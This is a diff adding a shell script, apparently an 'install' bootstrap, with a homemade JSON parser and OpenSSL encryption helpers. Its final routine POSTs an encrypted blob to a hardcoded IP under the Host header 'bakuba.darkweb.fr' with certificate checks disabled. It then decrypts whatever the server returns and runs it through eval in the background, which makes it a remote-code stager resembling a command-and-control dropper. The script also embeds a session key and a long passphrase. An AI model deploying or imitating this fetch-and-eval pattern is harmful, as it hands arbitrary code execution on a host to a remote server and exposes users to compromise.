@@ -1,0 +1,413 @@
+#!/bin/sh
+# Copyright 2011-2026 Nicolas "DarkHack" Chapuis
+#
+# Licensed under the Apache License, Version 2.0 (the "License");
+# you may not use this file except in compliance with the License.
+# You may obtain a copy of the License at
+#
+#     http://www.apache.org/licenses/LICENSE-2.0
+#
+# Unless required by applicable law or agreed to in writing, software
+# distributed under the License is distributed on an "AS IS" BASIS,
+# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+# See the License for the specific language governing permissions and
+# limitations under the License.
+
+cmdSh="$(which sh)"
+cmdEcho="$(which echo)"
+cmdPrintf="$(which printf)"
+cmdTr="$(which tr)"
+cmdCut="$(which cut)"
+cmdGrep="$(which grep)"
+cmdShuf="$(which shuf)"
+
+cmdCat="$(which cat)"
+cmdCp="$(which cp)"
+cmdRm="$(which rm)"
+cmdMkdir="$(which mkdir)"
+cmdChmod="$(which chmod)"
+
+cmdMktemp="$(which mktemp)"
+cmdMkfifo="$(which mkfifo)"
+
+cmdKill="$(which kill)"
+#cmdTrap="$(which trap)"
+cmdSleep="$(which sleep)"
+
+cmdWget="$(which wget)"
+
+cmdBase64="$(which base64)"
+cmdMd5sum="$(which md5sum)"
+cmdOpenssl="$(which openssl)"
+
+cmdDmidecode="$(which dmidecode)"
+
+
+#!/bin/sh
+
+cmdList="cmdTr cmdCut cmdEcho cmdPrintf"
+for cmd in $cmdList;do
+ if [ -z "$(eval $cmdPrintf \$$cmd)" ];then $cmdPrintf "missing cmd:$cmd for lib-sh/json";exit 1;fi
+done
+
+# jsonValue=$($cmdPrintf "$jsonData" | jsonInObjectRead "$jsonKey")
+# jsonData=$($cmdPrintf "$jsonData" | jsonInObjectWrite "$jsonKey" "$jsonValue")
+
+jsonInObjectRead() {
+ local log="jsonInObjectRead:"
+ 
+ local jsonData=""
+ while read data; do
+  local jsonData="${data}${jsonData}"
+ done
+ 
+ local dataObject="$($cmdPrintf $jsonData | $cmdCut -d'{' -f2 | $cmdCut -d'}' -f1 | $cmdTr ' ' '¤' )"
+ local name="$1"
+ 
+ for data in $($cmdPrintf $dataObject | $cmdTr ',' ' ');do
+   local dataName="$($cmdPrintf $data | $cmdCut -d: -f1 | $cmdCut -d\" -f2 | $cmdTr -d '¤')"
+#   $cmdPrintf "dataName:$dataName"
+   if [ "$dataName" = "$name" ];then
+#    local dataVal="$($cmdPrintf $data | $cmdCut -d: -f2-)"
+#    $cmdPrintf $dataVal
+    $cmdPrintf $data | $cmdCut -d: -f2- | $cmdCut -d\" -f2 | $cmdTr '¤' ' '
+    break;
+   fi
+ done
+}
+
+jsonInObjectWrite() {
+ local log="jsonInObjectWrite:"
+ 
+ local jsonData=""
+ while read data; do
+  local jsonData="${data}${jsonData}"
+ done
+ 
+ local dataObject="$($cmdPrintf $jsonData | $cmdCut -d'{' -f2 | $cmdCut -d'}' -f1 | $cmdTr ' ' '¤' )"
+ local name="$1"
+ local value="$2"
+ local newDataObject=""
+
+ local writed=0
+ for data in $($cmdPrintf $dataObject | $cmdTr ',' ' ');do
+   local dataName="$($cmdPrintf $data | $cmdCut -d: -f1 | $cmdCut -d\" -f2)"
+   if [ "$dataName" = "$name" ];then
+    if [ -z "$newDataObject" ];then
+     local newDataObject="\"$name\":\"$value\""
+    else
+     local newDataObject="\"$name\":\"$value\",$newDataObject"
+    fi
+    local writed=1
+   else
+    if [ -z "$newDataObject" ];then
+     local newDataObject="$data"
+    else
+     local newDataObject="$data,$newDataObject"
+    fi
+   fi
+ done
+ if [ "$writed" -eq 0 ];then
+  if [ -z "$newDataObject" ];then
+   local newDataObject="\"$name\":\"$value\""
+  else
+   local newDataObject="\"$name\":\"$value\",$newDataObject"
+  fi
+ fi
+ $cmdPrintf "{$newDataObject}" | $cmdTr '¤' ' '
+}
+
+#!/bin/sh
+cmdList="cmdSh cmdTr cmdWget cmdBase64 cmdPrintf"
+cmdList="$cmdList cmdRm cmdMktemp cmdMkfifo"
+cmdList="$cmdList cmdOpenssl"
+
+shCryptciphers="$shCryptciphers:aes-128-cbc:aes-128-cfb:aes-128-cfb1"
+shCryptciphers="$shCryptciphers:aes-128-cfb8:aes-128-ctr:aes-128-ecb"
+shCryptciphers="$shCryptciphers:aes-128-gcm:aes-128-ofb:aes-128-xts"
+shCryptciphers="$shCryptciphers:aes-192-cbc:aes-192-cfb:aes-192-cfb1"
+shCryptciphers="$shCryptciphers:aes-192-cfb8:aes-192-ctr:aes-192-ecb"
+shCryptciphers="$shCryptciphers:aes-192-gcm:aes-192-ofb:aes-256-cbc"
+shCryptciphers="$shCryptciphers:aes-256-cfb:aes-256-cfb1:aes-256-cfb8"
+shCryptciphers="$shCryptciphers:aes-256-ctr:aes-256-ecb:aes-256-gcm"
+shCryptciphers="$shCryptciphers:aes-256-ofb:aes-256-xts:aes128"
+shCryptciphers="$shCryptciphers:aes192:aes256:bf"
+shCryptciphers="$shCryptciphers:bf-cbc:bf-cfb:bf-ecb"
+shCryptciphers="$shCryptciphers:bf-ofb:blowfish:camellia-128-cbc"
+shCryptciphers="$shCryptciphers:camellia-128-cfb:camellia-128-cfb1:camellia-128-cfb8"
+shCryptciphers="$shCryptciphers:camellia-128-ecb:camellia-128-ofb:camellia-192-cbc"
+shCryptciphers="$shCryptciphers:camellia-192-cfb:camellia-192-cfb1:camellia-192-cfb8"
+shCryptciphers="$shCryptciphers:camellia-192-ecb:camellia-192-ofb:camellia-256-cbc"
+shCryptciphers="$shCryptciphers:camellia-256-cfb:camellia-256-cfb1:camellia-256-cfb8"
+shCryptciphers="$shCryptciphers:camellia-256-ecb:camellia-256-ofb:camellia128"
+shCryptciphers="$shCryptciphers:camellia192:camellia256:cast"
+shCryptciphers="$shCryptciphers:cast-cbc:cast5-cbc:cast5-cfb"
+shCryptciphers="$shCryptciphers:cast5-ecb:cast5-ofb:des"
+shCryptciphers="$shCryptciphers:des-cbc:des-cfb:des-cfb1"
+shCryptciphers="$shCryptciphers:des-cfb8:des-ecb:des-ede"
+shCryptciphers="$shCryptciphers:des-ede-cbc:des-ede-cfb:des-ede-ofb"
+shCryptciphers="$shCryptciphers:des-ede3:des-ede3-cbc:des-ede3-cfb"
+shCryptciphers="$shCryptciphers:des-ede3-cfb1:des-ede3-cfb8:des-ede3-ofb"
+shCryptciphers="$shCryptciphers:des-ofb:des3:desx"
+shCryptciphers="$shCryptciphers:desx-cbc:id-aes128-GCM:id-aes192-GCM"
+shCryptciphers="$shCryptciphers:id-aes256-GCM:rc2:rc2-40-cbc"
+shCryptciphers="$shCryptciphers:rc2-64-cbc:rc2-cbc:rc2-cfb"
+shCryptciphers="$shCryptciphers:rc2-ecb:rc2-ofb:rc4"
+shCryptciphers="$shCryptciphers:rc4-40:rc4-hmac-md5:seed"
+shCryptciphers="$shCryptciphers:seed-cbc:seed-cfb:seed-ecb"
+shCryptciphers="$shCryptciphers:seed-ofb"
+
+shCryptciphers="aes128"
+for cmd in $cmdList;do
+ if [ -z "$(eval echo \$$cmd)" ];then echo "[FATAL] missing cmd:$cmd";exit 1;fi
+done
+# shCryptInitPipe
+# shCryptWritePipe "pipe"
+# shCryptCommonCiphers "ciphersA" "ciphersB"
+# 
+cptPipe=3
+shCryptInitPipe() {
+ PIPE_passCrypt="$($cmdMktemp -u)"
+ $cmdMkfifo $PIPE_passCrypt
+ if [ $cptPipe -eq 3 ];then
+  exec 3<>$PIPE_passCrypt
+ elif [ $cptPipe -eq 4 ];then
+  exec 4<>$PIPE_passCrypt
+ elif [ $cptPipe -eq 5 ];then
+  exec 5<>$PIPE_passCrypt
+ elif [ $cptPipe -eq 6 ];then
+  exec 6<>$PIPE_passCrypt
+ elif [ $cptPipe -eq 7 ];then
+  exec 7<>$PIPE_passCrypt
+ elif [ $cptPipe -eq 8 ];then
+  exec 8<>$PIPE_passCrypt
+ elif [ $cptPipe -eq 9 ];then
+  exec 9<>$PIPE_passCrypt
+ else
+  $cmdPrintf "echec no more 7 pipe secure."
+ fi
+ $cmdRm $PIPE_passCrypt
+# $cmdPrintf $cptPipe
+ cptPipe=$(( cptPipe+1 )) ;
+}
+shCryptWritePipe() {
+ idxPipe="$1"
+ read data
+ if [ $idxPipe -eq 3 ];then
+  $cmdPrintf "$data" >&3
+ elif [ $idxPipe -eq 4 ];then
+  $cmdPrintf "$data" >&4
+ elif [ $idxPipe -eq 5 ];then
+  $cmdPrintf "$data" >&5
+ elif [ $idxPipe -eq 6 ];then
+  $cmdPrintf "$data" >&6
+ elif [ $idxPipe -eq 7 ];then
+  $cmdPrintf "$data" >&7
+ elif [ $idxPipe -eq 8 ];then
+  $cmdPrintf "$data" >&8
+ elif [ $idxPipe -eq 9 ];then
+  $cmdPrintf "$data" >&9
+ else
+  $cmdPrintf "echec no more 7 pipe secure."
+ fi
+}
+shCryptListCiphers() {
+ local debug="$1"
+ shCryptTestCiphers "$shCryptciphers" "$debug"
+}
+shCryptTestCiphers() {
+ local tCiphers="$1"
+ local debug="$2"
+ local ciphers=""
+ local passTest="uneTestMotDePasse"
+ 
+ shCryptInitPipe
+ local cryptPassPipe=$(( cptPipe-1 ))
+ for cipher in $($cmdPrintf $tCiphers | $cmdTr ':' ' ' );do
+  $cmdPrintf "$passTest" | shCryptWritePipe $cryptPassPipe
+  cryptData="$($cmdPrintf data | shCryptEncode $cipher $cryptPassPipe)"
+  $cmdPrintf "$passTest" | shCryptWritePipe $cryptPassPipe
+  clearData="$($cmdPrintf $cryptData | shCryptDecode $cipher $cryptPassPipe)"
+  if [ "$clearData" = "data" ];then
+    local ciphers="$cipher:$ciphers"
+    if [ -n "$debug" ];then $cmdPrintf "accept $cipher \n$cryptData\n$clearData";fi
+  else
+    if [ -n "$debug" ];then $cmdPrintf "reject $cipher \n$cryptData\n$clearData";fi
+  fi
+ done
+ $cmdPrintf $ciphers
+}
+shCryptCommonCiphers() {
+ local mCiphers="$1"
+ local sCiphers="$2"
+ local ciphers=""
+ for mCipher in $($cmdPrintf $mCiphers | $cmdTr -d '\n' | $cmdTr ':' ' ' );do
+  for sCipher in $($cmdPrintf $sCiphers | $cmdTr -d '\n' | $cmdTr ':' ' ' );do
+   if [ "$mCipher" = "$sCipher" ];then
+    local ciphers="$mCipher:$ciphers"
+   fi
+  done
+ done
+ $cmdPrintf $ciphers
+}
+shCryptRandomASCCI() {
+ local length="$1"
+ local randomStr="";
+ local cpt=0;
+ if [ ! $length -gt $cpt ];then echo "no length"
+ else
+  while [ $length -gt $cpt ];do
+   type="$($cmdShuf -i 0-2 -n 1)"
+   case "$type" in 
+    0) local range="65-90";;
+    1) local range="97-122";;
+    2) local range="48-57";;
+   esac
+   randomStr="$randomStr$(printf \\$(printf '%03o' $($cmdShuf -i $range -n 1) ))"
+   cpt=$(( cpt+1 ))
+  done
+ fi
+ $cmdPrintf $randomStr
+}
+shCryptRandomCipher() {
+ local cryptCiphers="$1"
+ shCryptGetCipher "$($cmdShuf -i 1-$(shCryptCountCiphers \"$cryptCiphers\") -n 1)" "$cryptCiphers"
+}
+shCryptCountCiphers() {
+ local ciphers="$1"
+ local cpt=0
+
+ for cipher in $($cmdPrintf $ciphers | $cmdTr -d '\n' | $cmdTr ':' ' ' );do
+  if [ -n "$cipher" ];then local cpt=$(( cpt+1 ));fi
+ done
+ $cmdPrintf "$cpt"
+}
+shCryptGetCipher() {
+ local index="$1"
+ local ciphers="$2"
+ local cpt=1
+
+ for cipher in $($cmdPrintf $ciphers | $cmdTr -d '\n' | $cmdTr ':' ' ' );do
+  [ $cpt -eq $index ] && $cmdPrintf "$cipher" && break || cpt=$(( cpt+1 )) ;
+ done
+}
+shCryptDecode() {
+ local cipher=$1
+ local pass=$2
+ local decrypt_cmd="$cmdOpenssl enc -$cipher -d -pass fd:$pass"
+ 
+ read data64
+ 
+ $cmdPrintf $data64 | $cmdTr -d '\r' | $cmdTr -d '\n' | $cmdTr -d ' ' | $cmdBase64 -d -i 2>/dev/null | $decrypt_cmd 2>/dev/null | $cmdTr -d ' ' | $cmdTr -d '\r' | $cmdTr -d '\n' | $cmdBase64 -d -i 2>/dev/null
+}
+
+shCryptEncode() {
+ local cipher=$1
+ local pass=$2
+ local encrypt_cmd="$cmdOpenssl enc -$cipher -salt -pass fd:$pass"
+ 
+ read data
+ 
+ $cmdPrintf $data | $cmdBase64 | $encrypt_cmd 2>/dev/null | $cmdBase64 | $cmdTr -d '\r' | $cmdTr -d '\n' | $cmdTr -d ' '
+}
+
+
+#!/bin/sh
+cmdList="cmdWget"
+
+for cmd in $cmdList;do
+ if [ -z "$(eval echo \$$cmd)" ];then echo "[FATAL] missing cmd:$cmd";exit 1;fi
+done
+
+agarthaSend() {
+ local ipAddress=$1
+ local host=$2
+ 
+#$cmdPrintf data http boundary  ------------------------------
+#boundary="FILEUPLOAD"
+#
+#postData="--$boundary"
+#postData="$postData\r\nContent-Disposition: form-data; name=\"data\";"
+#postData="$postData\r\nContent-Type: application/octet-stream"
+#postData="$postData\r\nMedia Type: application/octet-stream"
+#postData="$postData\r\n\r\n$encData\r\n"
+#postData="$postData\r\n--$boundary--\r\n"
+#
+#$cmdPrintf "agarthaSend   -----------------------------------"
+
+ read encData
+ 
+ $cmdWget --header="Content-type: multipart/form-data" --post-data="data=$encData"\
+ --no-check-certificate -O - -q -t 1 --timeout=10 --dns-timeout=10 --connect-timeout=10 --read-timeout=10\
+ --header="Host: $host" "https://$ipAddress/Agartha"
+}
+
+#!/bin/sh
+
+cmdList="cmdSh cmdEcho cmdPrintf cmdCat cmdSleep cmdKill cmdBase64 cmdOpenssl cmdShuf"
+
+for cmd in $cmdList;do
+ if [ -z "$(eval $cmdPrintf \$$cmd)" ];then $cmdPrintf "[FATAL] missing cmd:$cmd";exit 1;fi
+done
+
+start() {
+ local jsonData=""
+ while read data; do
+  local jsonData="${data}${jsonData}"
+ done
+
+ $cmdPrintf "init pipe:"
+ shCryptInitPipe
+ cryptPassPipe=$(( cptPipe-1 ))
+ $cmdPrintf "pipe:$cryptPassPipe ------------------------------------"
+ 
+ $cmdPrintf "============================== [ Start ] =============================="
+ cryptPass="$(echo $jsonData | jsonInObjectRead next-pass)"
+ cryptCipher="$(echo $jsonData | jsonInObjectRead next-cipher)"
+ ciphers="$(echo $jsonData | jsonInObjectRead ciphers)"
+ cryptCiphers="$(shCryptCommonCiphers "$ciphers" "$(shCryptListCiphers)")"
+ 
+ ipAddress="$(echo $jsonData | jsonInObjectRead ipaddress)"
+ fileLog="./bakubaInitInstall.log"
+ 
+ $cmdPrintf "list ciphers:$(shCryptCountCiphers $cryptCiphers) ------------------------------------"
+
+ cryptNextPass="$(shCryptRandomASCCI 1000)"
+ cryptNextCipher="$(shCryptRandomCipher $cryptCiphers)"
+
+ $cmdPrintf "json encode  ------------------------------------"
+ jsonData=$($cmdPrintf "$jsonData" | jsonInObjectWrite "ciphers" "$cryptCiphers")
+ jsonData=$($cmdPrintf "$jsonData" | jsonInObjectWrite "next-cipher" "$cryptNextCipher")
+ jsonData=$($cmdPrintf "$jsonData" | jsonInObjectWrite "next-pass" "$cryptNextPass")
+
+ $cmdPrintf "shCryptEncode     ------------------------------------"
+ $cmdPrintf "$cryptPass" | shCryptWritePipe $cryptPassPipe
+ encData="$($cmdPrintf "$jsonData" | shCryptEncode "$cryptCipher" "$cryptPassPipe" )"
+
+ $cmdPrintf "shCryptDecode test  ------------------------------------"
+ $cmdPrintf "$cryptPass" | shCryptWritePipe $cryptPassPipe
+ $cmdPrintf "$($cmdPrintf $encData | shCryptDecode "$cryptCipher" "$cryptPassPipe" )"
+
+ $cmdPrintf "connect Agartha to :$ipAddress fileLog:$fileLog ========================================================="
+ 
+ $cmdPrintf "$cryptNextPass" | shCryptWritePipe $cryptPassPipe
+ eval "$($cmdPrintf "$encData" | agarthaSend "$ipAddress" "bakuba.darkweb.fr" | shCryptDecode "$cryptNextCipher" "$cryptPassPipe" | $cmdBase64 -d -i 2>/dev/null)" > $fileLog 2>&1 &
+
+ pid=$!
+
+#$cmdPrintf "$cmdTrap "$cmdKill $pid 2>/dev/null" EXIT"
+#$cmdTrap "$cmdKill $pid 2>/dev/null" EXIT
+
+# While transfere is running...
+cpt=0
+while $cmdKill -0 $pid 2>/dev/null; do
+ $cmdPrintf "sleep 1 before show log,transfere is running:$cpt\r"
+ $cmdSleep 1
+ cpt=$(( cpt+1 )) ;
+done
+
+$cmdPrintf "connect Agartha log : ------------------------------------------------"
+$cmdCat $fileLog
+
+
+$cmdPrintf "{"cpt":0,"ipaddress":"10.85.88.3","sessionKey":"5f96b553197d4","ciphers":"aes128:\n","next-pass":"2AZB5L0fXo935a2nkQMvcR00RPQWSWr495O7XMu6j3zBt0QE8Ek3ElC6UiBY24Fj6Sd7OOtkF59rQG7ex0Rx98Cw5j3jni3TfKiXcBmXAbcZPZt7Oga8Ho3qo2wYB7RbxrXrB9RnfTgIgsYkhY6X0MzWmknNmXsygqYP014P34n25XLRd6Z5ZvSX5OTXhO41rGi1EGbGQ2NWucG13yA6ukHr85hoZWZ34BE0KDoj17ji0j8NwbeKeQusZw8Z9CS233Bw89v0ax246Sl61La3Sk6jABES490G9y35iuyv101aF8TW4TYm1008w9K7yQF30F0Tc62XijGGXy175B4S4tjTsu3VjrSrKq8TXOU7y49923DxZkzQt16d4mQAyNs677Aw5gpCX5XOBqD1U0u5S7Yo6hW9n796YwGf6j3swpj3t98phTHFGjkx1CDcqO271x3P8VmJAvqV045vl3Su5cxrUa001BoTT63oij89J3M84aqg42b5t1Hrr439X8dzA0l38BhP7JAbAmi703NqGx2muV8P81p7vNlORZ5JzNk597CmngN5MDsXW6121djQjWBrH9350eHU8288ui2hGS5KyXZvc43U9Rj7DnA7XcKqrXt5Md2Xl1nOn7gh0q5U9mKqrfENBZ7yqvuK2sZY8wX16gL1R1u2S2238y9nRm786BfgcW0J8Mm9ZDf6qkf0IpPzPXF9Cnd06nG2515YHl1IWLp2dC0bbtQ32mVdrV4B7upg1zJr3lRg55P229mJQvc9Eh5kB03cV1frCiwfAQoE7Eia8283381kB8MB4s55JnvS7ycpPTA67aAlXNExrdrkk2M69nApcNYTys4Htfb064O92ZyWM39o4FJh7hup5Qxk49qM7Vx902bx3m0Z0O5Rb4J5Cf7vLdR4lyXkTX6tXis3OCiR0w9HWd971xCa35v5D5drlkYwXlev6cjYzE33e6oHF9wKh0XI8YGr915b9u4n86A8s20RsH20\n","next-cipher":"aes128"}" | start
